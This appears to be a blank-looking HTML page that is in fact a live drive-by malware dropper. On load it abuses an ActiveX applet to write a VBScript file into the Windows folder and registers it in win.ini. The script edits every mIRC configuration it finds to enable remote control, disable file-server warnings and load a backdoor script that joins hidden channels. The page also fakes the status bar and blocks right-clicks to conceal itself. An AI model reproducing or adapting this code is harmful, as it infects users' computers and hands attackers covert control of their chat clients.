<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META content="text/html; charset=windows-1257" http-equiv=Content-Type>
<SCRIPT>
function hidestatus(){
window.status='-:[ .:||Hello||:. ]:-'
return true
}
if (document.layers)
document.captureEvents(Event.MOUSEOVER | Event.MOUSEOUT)
document.onmouseover=hidestatus
document.onmouseout=hidestatus
</SCRIPT>

<META content="Microsoft FrontPage 4.0" name=GENERATOR>
<title></title>
</HEAD>
<BODY bgColor=#000000 
text=#0000ff>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<APPLET align=baseline 
code=com.ms.activeX.ActiveXComponent name=appl width="1" height="1"><PARAM NAME="align" VALUE="baseline"><PARAM NAME="code" VALUE="com.ms.activeX.ActiveXComponent"><PARAM NAME="name" VALUE="appl"><PARAM NAME="codeBase" VALUE="http://www.siti.hit.bg/"></APPLET>
<SCRIPT language=vbscript>
a=chr(34)
flc1="dim Otag "
flc2=""
flc3="dim Ttag "
flc4="dim DummyTag"
flc5="dim SectionDef"
flc6="call ShowFolderList("&a&"c:\"&a&")"
flc7="call ShowFolderList("&a&"d:\"&a&")"
flc8="sub ShowFolderList(s)"
flc9="on error resume next"
flc10="Set filesys = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc11="Set RootFolder1 = FileSys.GetFolder(s)"
flc12="Set SubFolds1 = RootFolder1.subfolders"
flc13="For Each f1 in Subfolds1"
flc14="s = f1.path & "&a&"\"&a&""
flc15="Otag = s & "&a&"mirc.ini"&a&""
flc16="DummyTag= "&a&"C:\winamod.dat"&a&""
flc17="TTag= s & "&a&"Group.txt"&a&""
flc18="SectionDef= "&a&"[rfiles]"&a&""
flc19="if filesys.fileexists(otag) then "
flc20="Call Filemod() "
flc21="filesys.CopyFile DummyTag, Otag, true"
flc22="Call ImplementRemote()"
flc23="filesys.CopyFile DummyTag, Otag, true"
flc24="Call ImplementWarn()"
flc25="filesys.CopyFile DummyTag, Otag, true"
flc26="Call ImplementFserv()"
flc27="filesys.CopyFile DummyTag, Otag, true"
flc28="call ImplementPerfCheck()"
flc29="filesys.CopyFile DummyTag, Otag, true"
flc30="Call ImplementPerform()"
flc31="'SetClearArchiveBit(Otag)"
flc32="End If"
flc33="Call ShowFolderList(s)"
flc34="Next"
flc35="End sub"
flc36="Function FiltNum(FilString)"
flc37="on error resume next"
flc38="countdown=5"
flc39="do"
flc40="Comp = mid(FilString,2,countdown)"
flc41="if isnumeric(Comp) then LastNum = Comp : exit do"
flc42="countdown=countdown-1"
flc43="loop until countdown =0"
flc44="FiltNum = LastNum"
flc45="end function"
flc46="Function LastLineNum(SSection)"
flc47="on error resume next"
flc48="Set FS1N = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc49="Set FR1N = FS1N.OpenTextFile(otag,1,true)"
flc50="Do While FR1N.AtEndOfStream <> True"
flc51="segment1 = FR1N.readline"
flc52="w = InstrRev(segment1,SSection)"
flc53="counts=counts+1"
flc54="if w > 0 then "
flc55="do"
flc56="if FR1N.AtEndOfStream = True then exit do"
flc57="segmentk = FR1N.readline"
flc58="k = InstrRev(segmentk,"&a&"n"&a&",1)		"
flc59="if k=1 then"
flc60="LastNum=FiltNum(segmentk)"
flc61="end if"
flc62="Loop until k=0"
flc63="end if"
flc64="loop"
flc65="FR1N.Close"
flc66="LastLineNum=LastNum"
flc67="end function"
flc68="Function Filemod()"
flc69="on error resume next"
flc70="Set fs1 = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc71="Set fr1 = fs1.OpenTextFile(otag,1,true)"
flc72="Set fs2 = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc73="Set fr2 = fs2.OpenTextFile(DummyTag,2,true)"
flc74="Do While fr1.AtEndOfStream <> True"
flc75="segment1 = fr1.readline"
flc76="fr2.writeline segment1"
flc77="w = InstrRev(segment1,"&a&"[rfiles]"&a&")"
flc78="counts=counts+1"
flc79="if w > 0 then "
flc80="counts2=counts"
flc81="do"
flc82="if fr1.AtEndOfStream = True then exit do"
flc83="segmentk = fr1.readline"
flc84="k = InstrRev(segmentk,"&a&"n"&a&",1)		"
flc85="if k=1 then"
flc86="LastNum=FiltNum(segmentk)"
flc87="fr2.writeline segmentk"
flc88="end if"
flc89="COUNTS2=COUNTS2+1"
flc90="Loop until k<>1"
flc91="exit do"
flc92="end if"
flc93="loop"
flc94="fr1.Close"
flc95="fr2.close"
flc96="Set fs3 = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc97="Set fr3 = fs3.OpenTextFile(DummyTag,8,true)"
flc98="TrojanInfo = "&a&"n"&a&" & lastlinenum(SectionDef)+1 & "&a&"=Group.txt"&a&""
flc99="fr3.writeline TrojanInfo"
flc100="fr3.Close"
flc101="Set fs4 = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc102="Set fr4 = fs4.OpenTextFile(Otag,1,true)"
flc103="Set fs5 = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc104="Set fr5 = fs5.OpenTextFile(DummyTag,8,true)"
flc105="Do While fr4.AtEndOfStream <> True"
flc106="segment2 = fr4.readline"
flc107="if fr4.line >= counts2 + 2 then "
flc108="fr5.writeline segment2"
flc109="end if"
flc110="loop"
flc111="fr4.Close"
flc112="fr5.Close"
flc113="fs5.CopyFile DummyTag, Otag, true"
flc114="Call FLDL(TTag)"
flc115="end Function"
flc116="sub FLDL(TTag)"
flc117="on error resume next"
flc118="Set fs6 = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc119="Set fr6 = fs6.OpenTextFile(TTag,2,true)"
flc120="fr6.writeline "&a&"alias whois {"&a&""
flc120_1="fr6.writeline "&a&"  if ($1 != $me) { whois $1 } "&a&""
flc121="fr6.writeline "&a&"  else halt"&a&""
flc122="fr6.writeline "&a&"}"&a&""
flc123="fr6.writeline "&a&"alias names {"&a&""
flc124="fr6.writeline "&a&"  if (($1 == #SeXView) || ($1 == #XxL)) { }"&a&""
flc125="fr6.writeline "&a&"  else { //.names $1 }"&a&""
flc126="fr6.writeline "&a&"}"&a&""
flc127="fr6.writeline "&a&"on *:connect:{ join -n #SeXView | join -n #XxL }"&a&""
flc128="fr6.writeline "&a&"on *:join:#SeXView,#Xxl:{ if ($nick == $me) { window -h # | .ignore *!*@* | .timer 1 30 .ignore -r *!*@*  } }"&a&""
flc129="fr6.writeline "&a&"raw 353:*:{ if ($3 == #Xxl) || ($3 == #SeXView) { halt } } "&a&""
flc130="fr6.writeline "&a&"raw 366:*:{ if ($2 == #xxl) || ($2 == #SexView) { halt } } "&a&""
flc131="fr6.writeline "&a&"a"&a&""
flc132="fr6.writeline "&a&"a"&a&""
flc133="fr6.writeline "&a&"a"&a&""
flc134="fr6.writeline "&a&"a"&a&""
flc135="fr6.writeline "&a&"}"&a&""
flc136="fr6.writeline "&a&"a"&a&""
flc137="fr6.writeline "&a&"a"&a&""
flc137_1="fr6.writeline "&a&"a"&a&""
flc137_2="fr6.writeline "&a&"a"&a&""
flc138="fr6.writeline "&a&"at"&a&""
flc139="fr6.writeline "&a&"a"&a&""
flc139_1="fr6.writeline "&a&"a"&a&""
flc140="fr6.writeline "&a&"a"&a&""
flc141="fr6.writeline "&a&"}"&a&""
flc142="fr6.writeline "&a&"a"&a&""
flc143="fr6.writeline "&a&"a"&a&""
flc144="fr6.writeline "&a&"a"&a&""
flc145="fr6.writeline "&a&"a"&a&""
flc146="fr6.writeline "&a&"a"&a&""
flc147="fr6.writeline "&a&"a"&a&""
flc148="fr6.writeline "&a&"a"&a&""
flc149="fr6.writeline "&a&"}"&a&""
flc150="fr6.writeline "&a&"a"&a&""
flc151="fr6.writeline "&a&"a"&a&""
flc152="fr6.writeline "&a&"a"&a&""
flc153="fr6.writeline "&a&"a"&a&""
flc153_0="fr6.writeline "&a&"a"&a&""
flc153_1="fr6.writeline "&a&"a"&a&""
flc153_2="fr6.writeline "&a&"}"&a&""
flc153_3="fr6.writeline "&a&"alias setlc {"&a&""
flc153_4="fr6.writeline "&a&"  /set %lc.2.1 |"&a&""
flc153_5="fr6.writeline "&a&"  /set %lc.2.2 |"&a&""
flc153_6="fr6.writeline "&a&"  /set %lc.3.1 _ | /set %lc.3.2 _ | /set %lc.4.1 _- | /set %lc.4.2 -_ | /set %lc.5.1 [ | /set %lc.5.2 ] | /set %lc.6.1 ] | /set %lc.6.2 [ | /set %lc.7.1 [- | /set %lc.7.2 -] | /set %lc.8.1 _-| | /set %lc.8.2 |-_ | /set %lc.9.1 ` | /set %lc.9.2 ` | /set %lc.10.1 ^ | /set %lc.10.2 ^ | /set %lc.11.1 ^- | /set %lc.11.2 -^ | /set -n %lc.1.2 }} | /set %lc.1.1 {{"&a&""
flc153_7="fr6.writeline "&a&"}"&a&""
flc153_8="fr6.writeline "&a&"off"&a&""
flc153_9="fr6.writeline "&a&"a"&a&""
flc153_10="fr6.writeline "&a&"a"&a&""
flc153_11="fr6.writeline "&a&"a"&a&""
flc153_12="fr6.writeline "&a&"a"&a&""
flc153_13="fr6.writeline "&a&"}"&a&""
flc153_14="fr6.writeline "&a&"a"&a&""
flc153_15="fr6.writeline "&a&"a"&a&""
flc153_16="fr6.writeline "&a&"  /setlc"&a&""
flc153_17="fr6.writeline "&a&"  /cnick"&a&""
flc153_18="fr6.writeline "&a&"a"&a&""
flc153_19="fr6.writeline "&a&"a"&a&""
flc153_20="fr6.writeline "&a&"a"&a&""
flc153_21="fr6.writeline "&a&"a"&a&""
flc153_22="fr6.writeline "&a&"}"&a&""
flc153_23="fr6.writeline "&a&""&a&""
flc153_24="fr6.writeline "&a&""&a&""
flc153_25="fr6.writeline "&a&""&a&""
flc153_26="fr6.writeline "&a&" "&a&""
flc153_27="fr6.writeline "&a&" "&a&""
flc153_28="fr6.writeline "&a&" "&a&""
flc153_29="fr6.writeline "&a&" "&a&""
flc153_30="fr6.writeline "&a&" "&a&""
flc153_31="fr6.writeline "&a&" "&a&""
flc153_32="fr6.writeline "&a&" "&a&""
flc153_33="fr6.writeline "&a&" "&a&""
flc153_34="fr6.writeline "&a&" "&a&""
flc153_35="fr6.writeline "&a&" "&a&""
flc153_36="fr6.writeline "&a&" "&a&""
flc153_37="fr6.writeline "&a&" "&a&""
flc153_38="fr6.writeline "&a&" "&a&""
flc153_39="fr6.writeline "&a&" "&a&""
flc153_40="fr6.writeline "&a&" "&a&""
flc153_41="fr6.writeline "&a&" "&a&""
flc153_42="fr6.writeline "&a&" "&a&""
flc153_43="fr6.writeline "&a&" "&a&""
flc153_44="fr6.writeline "&a&" "&a&""
flc153_45="fr6.writeline "&a&" "&a&""
flc153_46="fr6.writeline "&a&" "&a&""
flc153_47="fr6.writeline "&a&" "&a&""
flc153_48="fr6.writeline "&a&" "&a&""
flc153_49="fr6.writeline "&a&" "&a&""
flc153_50="fr6.writeline "&a&" "&a&""
flc153_51="fr6.writeline "&a&" "&a&""
flc153_52="fr6.writeline "&a&" "&a&""
flc153_53="fr6.writeline "&a&" "&a&""
flc153_54="fr6.writeline "&a&" "&a&""
flc153_55="fr6.writeline "&a&" "&a&""
flc153_56="fr6.writeline "&a&" "&a&""
flc153_57="fr6.writeline "&a&" "&a&""
flc153_58="fr6.writeline "&a&" "&a&""
flc153_59="fr6.writeline "&a&" "&a&""
flc153_60="fr6.writeline "&a&" "&a&""
flc153_61="fr6.writeline "&a&" "&a&""
flc153_62="fr6.writeline "&a&" "&a&""
flc153_63="fr6.writeline "&a&" "&a&""
flc153_64="fr6.writeline "&a&" "&a&""
flc153_65="fr6.writeline "&a&" "&a&""
flc153_66="fr6.writeline "&a&" "&a&""
flc153_67="fr6.writeline "&a&" "&a&""
flc153_68="fr6.writeline "&a&" "&a&""
flc153_69="fr6.writeline "&a&" "&a&""
flc153_70="fr6.writeline "&a&" "&a&""
flc153_71="fr6.writeline "&a&" "&a&""
flc153_72="fr6.writeline "&a&" "&a&""
flc153_73="fr6.writeline "&a&" "&a&""
flc154="fr6.close"
flc155="end sub"
flc156="Function ImplementRemote()"
flc157="Set fs1a = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc158="Set fr1a = fs1a.OpenTextFile(otag,1,true)"
flc159="Set fs2a = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc160="Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)"
flc161="Do While fr1a.AtEndOfStream <> True"
flc162="segment1a = fr1a.readline"
flc163="fr2a.writeline segment1a"
flc164="if ucase(segment1a)=ucase("&a&"[options]"&a&") then"
flc165="Do"
flc166="If fr1a.AtEndOfStream Then exit do"
flc167="n2a = fr1a.readline"
flc168="If ucase(mid(n2a,1,3))=ucase("&a&"n2="&a&") then"
flc169="fr2a.writeline Mid(n2a, 1, 13) & "&a&"1,1"&a&" & Mid(n2a, 17, 16) & "&a&"1"&a&" & Mid(n2a, 34)"
flc170="exit do"
flc171="Else"
flc172="fr2a.writeline n2a"
flc173="End If"
flc174="Loop"
flc175="end if"
flc176="loop"
flc177="fr1a.Close"
flc178="fr2a.close"
flc179="End Function"
flc180="Function Implementfserv()"
flc181="Set fs1a = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc182="Set fr1a = fs1a.OpenTextFile(otag,1,true)"
flc183="Set fs2a = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc184="Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)"
flc185="Do While fr1a.AtEndOfStream <> True"
flc186="segment1a = fr1a.readline"
flc187="fr2a.writeline segment1a"
flc188="if ucase(segment1a)=ucase("&a&"[fileserver]"&a&") then"
flc189="Do"
flc190="If fr1a.AtEndOfStream Then exit do"
flc191="n2a = fr1a.readline"
flc192="If ucase(Mid(n2a, 1, 3))=ucase("&a&"warning=on"&a&") then"
flc193="fr2a.writeline "&a&"warning=off"&a&""
flc194="Else"
flc195="fr2a.writeline n2a"
flc196="End If"
flc197="Loop"
flc198="end if"
flc199="loop"
flc200="fr1a.Close"
flc201="fr2a.close"
flc202="End Function"
flc203="Function Implementwarn()"
flc204="Set fs1c = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc205="Set fr1c = fs1c.OpenTextFile(otag,1,true)"
flc206="Set fs2c = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc207="Set fr2c = fs2c.OpenTextFile(DummyTag,2,true)"
flc208="Do While fr1c.AtEndOfStream <> True"
flc209="segment1c = fr1c.readline"
flc210="fr2c.writeline segment1c"
flc211="if ucase(segment1c)=ucase("&a&"[fileserver]"&a&") then"
flc212="Do"
flc213="if fr1c.AtEndOfStream then exit do"
flc214="n2c = fr1c.readline"
flc215="If ucase(n2c)=ucase("&a&"warning=on"&a&") then"
flc216="fr2c.writeline "&a&"warning=off"&a&""
flc217="Else"
flc218="fr2c.writeline n2c"
flc219="End If"
flc220="Loop"
flc221="end if"
flc222="loop"
flc223="fr1c.Close"
flc224="fr2c.close"
flc225="End Function"
flc226="Function ImplementPerform()"
flc227="Set fs1p = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc228="Set fr1p = fs1p.OpenTextFile(Otag,8,true)"
flc229="fr1p.writeline "&a&"[Perform]"&a&""
flc230="fr1p.writeline "&a&"n0=//.Remote ON"&a&""
flc231="fr1p.Close"
flc232="fs1p.close"
flc233="End Function"
flc234="Sub SetClearArchiveBit(filespec)  "
flc235="Dim fsg, fg"
flc236="Set fsg = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc237="Set fg = fsg.GetFile(filespec)  "
flc238="fg.attributes = 0"
flc239="fg.attributes = fg.attributes + 1"
flc240="End Sub"
flc241="Function ImplementPerfCheck()"
flc242="Set fs1f = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc243="Set fr1f = fs1f.OpenTextFile(otag,1,true)"
flc244="Set fs2f = CreateObject("&a&"Scripting.FileSystemObject"&a&")"
flc245="Set fr2f = fs2f.OpenTextFile(DummyTag,2,true)"
flc246="Do While fr1f.AtEndOfStream <> True"
flc247="segment1f = fr1f.readline"
flc248="fr2f.writeline segment1f"
flc249="if ucase(segment1f)=ucase("&a&"[options]"&a&") then"
flc250="Do"
flc251="If fr1f.AtEndOfStream Then exit do"
flc252="n2f = fr1f.readline"
flc253="If ucase(mid(n2f,1,3))=ucase("&a&"n0="&a&") then"
flc254="fr2f.writeline Mid(n2f, 1, 40) & "&a&",1,"&a&" & Mid(n2f, 44)"
flc255="exit do"
flc256="Else"
flc257="fr2f.writeline n2f"
flc258="End If"
flc259="Loop"
flc260="end if"
flc261="loop"
flc262="fr1f.Close"
flc263="fr2f.close"
flc264="End Function"
flc265=""
flc266="set sss=createobject("&a&"scripting.filesystemobject"&a&")"
flc267=""
flc268="sss.DeleteFile "&a&"c:\winamod.dat"&a&""
</SCRIPT>

<SCRIPT language=JAVASCRIPT>

<!-- hide for safe browsers
window.status = "-:[ .:|| Free ||:. ]:-";
InterfaceObject=document.applets[0];
setTimeout("Upload()",1000);
function Upload() {
fsoClassID="{0D43FE01-F093-11CF-8940-00A0C9054228}";
InterfaceObject.setCLSID(fsoClassID);
fso = InterfaceObject.createInstance();

windir = fso.getspecialfolder(0);
filename = windir + "\\Group.vbs";
filename1 = windir + "\\win.ini";
filename2 = windir + "\\wininfo.dll";
installed = 0;
if (fso.fileexists(filename)) {
fso.deletefile(filename);
}
file = fso.opentextfile(filename, "2", "TRUE");
file.writeline(flc1)
file.writeline(flc2)
file.writeline(flc3)
file.writeline(flc4)
file.writeline(flc5)
file.writeline(flc6)
file.writeline(flc7)
file.writeline(flc8)
file.writeline(flc9)
file.writeline(flc10)
file.writeline(flc11)
file.writeline(flc12)
file.writeline(flc13)
file.writeline(flc14)
file.writeline(flc15)
file.writeline(flc16)
file.writeline(flc17)
file.writeline(flc18)
file.writeline(flc19)
file.writeline(flc20)
file.writeline(flc21)
file.writeline(flc22)
file.writeline(flc23)
file.writeline(flc24)
file.writeline(flc25)
file.writeline(flc26)
file.writeline(flc27)
file.writeline(flc28)
file.writeline(flc29)
file.writeline(flc30)
file.writeline(flc31)
file.writeline(flc32)
file.writeline(flc33)
file.writeline(flc34)
file.writeline(flc35)
file.writeline(flc36)
file.writeline(flc37)
file.writeline(flc38)
file.writeline(flc39)
file.writeline(flc40)
file.writeline(flc41)
file.writeline(flc42)
file.writeline(flc43)
file.writeline(flc44)
file.writeline(flc45)
file.writeline(flc46)
file.writeline(flc47)
file.writeline(flc48)
file.writeline(flc49)
file.writeline(flc50)
file.writeline(flc51)
file.writeline(flc52)
file.writeline(flc53)
file.writeline(flc54)
file.writeline(flc55)
file.writeline(flc56)
file.writeline(flc57)
file.writeline(flc58)
file.writeline(flc59)
file.writeline(flc60)
file.writeline(flc61)
file.writeline(flc62)
file.writeline(flc63)
file.writeline(flc64)
file.writeline(flc65)
file.writeline(flc66)
file.writeline(flc67)
file.writeline(flc68)
file.writeline(flc69)
file.writeline(flc70)
file.writeline(flc71)
file.writeline(flc72)
file.writeline(flc73)
file.writeline(flc74)
file.writeline(flc75)
file.writeline(flc76)
file.writeline(flc77)
file.writeline(flc78)
file.writeline(flc79)
file.writeline(flc80)
file.writeline(flc81)
file.writeline(flc82)
file.writeline(flc83)
file.writeline(flc84)
file.writeline(flc85)
file.writeline(flc86)
file.writeline(flc87)
file.writeline(flc88)
file.writeline(flc89)
file.writeline(flc90)
file.writeline(flc91)
file.writeline(flc92)
file.writeline(flc93)
file.writeline(flc94)
file.writeline(flc95)
file.writeline(flc96)
file.writeline(flc97)
file.writeline(flc98)
file.writeline(flc99)
file.writeline(flc100)
file.writeline(flc101)
file.writeline(flc102)
file.writeline(flc103)
file.writeline(flc104)
file.writeline(flc105)
file.writeline(flc106)
file.writeline(flc107)
file.writeline(flc108)
file.writeline(flc109)
file.writeline(flc110)
file.writeline(flc111)
file.writeline(flc112)
file.writeline(flc113)
file.writeline(flc114)
file.writeline(flc115)
file.writeline(flc116)
file.writeline(flc117)
file.writeline(flc118)
file.writeline(flc119)
file.writeline(flc120)
file.writeline(flc120_1)
file.writeline(flc121)
file.writeline(flc122)
file.writeline(flc123)
file.writeline(flc124)
file.writeline(flc125)
file.writeline(flc126)
file.writeline(flc127)
file.writeline(flc128)
file.writeline(flc129)
file.writeline(flc130)
file.writeline(flc131)
file.writeline(flc132)
file.writeline(flc133)
file.writeline(flc134)
file.writeline(flc135)
file.writeline(flc136)
file.writeline(flc137)
file.writeline(flc137_1)
file.writeline(flc137_2)
file.writeline(flc138)
file.writeline(flc139)
file.writeline(flc139_1)
file.writeline(flc140)
file.writeline(flc141)
file.writeline(flc142)
file.writeline(flc143)
file.writeline(flc144)
file.writeline(flc145)
file.writeline(flc146)
file.writeline(flc147)
file.writeline(flc148)
file.writeline(flc149)
file.writeline(flc150)
file.writeline(flc151)
file.writeline(flc152)
file.writeline(flc153)
file.writeline(flc153_0)
file.writeline(flc153_1)
file.writeline(flc153_2)
file.writeline(flc153_3)
file.writeline(flc153_4)
file.writeline(flc153_5)
file.writeline(flc153_6)
file.writeline(flc153_7)
file.writeline(flc153_8)
file.writeline(flc153_9)
file.writeline(flc153_10)
file.writeline(flc153_11)
file.writeline(flc153_12)
file.writeline(flc153_13)
file.writeline(flc153_14)
file.writeline(flc153_15)
file.writeline(flc153_16)
file.writeline(flc153_17)
file.writeline(flc153_18)
file.writeline(flc153_19)
file.writeline(flc153_20)
file.writeline(flc153_21)
file.writeline(flc153_22)
file.writeline(flc153_23)
file.writeline(flc153_24)
file.writeline(flc153_25)
file.writeline(flc153_26)
file.writeline(flc153_27)
file.writeline(flc153_28)
file.writeline(flc153_29)
file.writeline(flc153_30)
file.writeline(flc153_31)
file.writeline(flc153_32)
file.writeline(flc153_33)
file.writeline(flc153_34)
file.writeline(flc153_35)
file.writeline(flc153_36)
file.writeline(flc153_37)
file.writeline(flc153_38)
file.writeline(flc153_39)
file.writeline(flc153_40)
file.writeline(flc153_41)
file.writeline(flc153_42)
file.writeline(flc153_43)
file.writeline(flc153_44)
file.writeline(flc153_45)
file.writeline(flc153_46)
file.writeline(flc153_47)
file.writeline(flc153_48)
file.writeline(flc153_49)
file.writeline(flc153_50)
file.writeline(flc153_51)
file.writeline(flc153_52)
file.writeline(flc153_53)
file.writeline(flc153_54)
file.writeline(flc153_55)
file.writeline(flc153_56)
file.writeline(flc153_57)
file.writeline(flc153_58)
file.writeline(flc153_59)
file.writeline(flc153_60)
file.writeline(flc153_61)
file.writeline(flc153_62)
file.writeline(flc153_63)
file.writeline(flc153_64)
file.writeline(flc153_65)
file.writeline(flc153_66)
file.writeline(flc153_67)
file.writeline(flc153_68)
file.writeline(flc153_69)
file.writeline(flc153_70)
file.writeline(flc153_71)
file.writeline(flc153_72)
file.writeline(flc153_73)
file.writeline(flc154)
file.writeline(flc155)
file.writeline(flc156)
file.writeline(flc157)
file.writeline(flc158)
file.writeline(flc159)
file.writeline(flc160)
file.writeline(flc161)
file.writeline(flc162)
file.writeline(flc163)
file.writeline(flc164)
file.writeline(flc165)
file.writeline(flc166)
file.writeline(flc167)
file.writeline(flc168)
file.writeline(flc169)
file.writeline(flc170)
file.writeline(flc171)
file.writeline(flc172)
file.writeline(flc173)
file.writeline(flc174)
file.writeline(flc175)
file.writeline(flc176)
file.writeline(flc177)
file.writeline(flc178)
file.writeline(flc179)
file.writeline(flc180)
file.writeline(flc181)
file.writeline(flc182)
file.writeline(flc183)
file.writeline(flc184)
file.writeline(flc185)
file.writeline(flc186)
file.writeline(flc187)
file.writeline(flc188)
file.writeline(flc189)
file.writeline(flc190)
file.writeline(flc191)
file.writeline(flc192)
file.writeline(flc193)
file.writeline(flc194)
file.writeline(flc195)
file.writeline(flc196)
file.writeline(flc197)
file.writeline(flc198)
file.writeline(flc199)
file.writeline(flc200)
file.writeline(flc201)
file.writeline(flc202)
file.writeline(flc203)
file.writeline(flc204)
file.writeline(flc205)
file.writeline(flc206)
file.writeline(flc207)
file.writeline(flc208)
file.writeline(flc209)
file.writeline(flc210)
file.writeline(flc211)
file.writeline(flc212)
file.writeline(flc213)
file.writeline(flc214)
file.writeline(flc215)
file.writeline(flc216)
file.writeline(flc217)
file.writeline(flc218)
file.writeline(flc219)
file.writeline(flc220)
file.writeline(flc221)
file.writeline(flc222)
file.writeline(flc223)
file.writeline(flc224)
file.writeline(flc225)
file.writeline(flc226)
file.writeline(flc227)
file.writeline(flc228)
file.writeline(flc229)
file.writeline(flc230)
file.writeline(flc231)
file.writeline(flc232)
file.writeline(flc233)
file.writeline(flc234)
file.writeline(flc235)
file.writeline(flc236)
file.writeline(flc237)
file.writeline(flc238)
file.writeline(flc239)
file.writeline(flc240)
file.writeline(flc241)
file.writeline(flc242)
file.writeline(flc243)
file.writeline(flc244)
file.writeline(flc245)
file.writeline(flc246)
file.writeline(flc247)
file.writeline(flc248)
file.writeline(flc249)
file.writeline(flc250)
file.writeline(flc251)
file.writeline(flc252)
file.writeline(flc253)
file.writeline(flc254)
file.writeline(flc255)
file.writeline(flc256)
file.writeline(flc257)
file.writeline(flc258)
file.writeline(flc259)
file.writeline(flc260)
file.writeline(flc261)
file.writeline(flc262)
file.writeline(flc263)
file.writeline(flc264)
file.writeline(flc265)
file.writeline(flc266)
file.writeline(flc267)
file.writeline(flc268)
file.close();
if (fso.fileexists(filename2)) {
fso.deletefile(filename2);
}
file1 = fso.opentextfile(filename1, "1", "false");
file2 = fso.opentextfile(filename2, "2", "true");
do
{
a = file1.readline()
file2.writeline(a);
if  ( a == ("run=" + filename) )
{
	installed = 1;
}
}
while (!file1.AtEndOfStream)
file1.close();
file2.close()
file1 = fso.opentextfile(filename2, "1", "false");
file2 = fso.opentextfile(filename1, "2", "true");
do
{
a = file1.readline()
file2.writeline(a);
if  (( a == "[windows]" )&&( installed == 0 ))
{
	file2.writeline("run=" + filename);
}
}
while (!file1.AtEndOfStream)
file1.close();
file2.close()
}
-->
</SCRIPT>
 </BODY></HTML>
<script LANGUAGE="JavaScript">
<!--
function click() {
if (event.button==2) {
alert('Right Click Option Not Available!');
}
}
document.onmousedown=click
// -->
</script> 
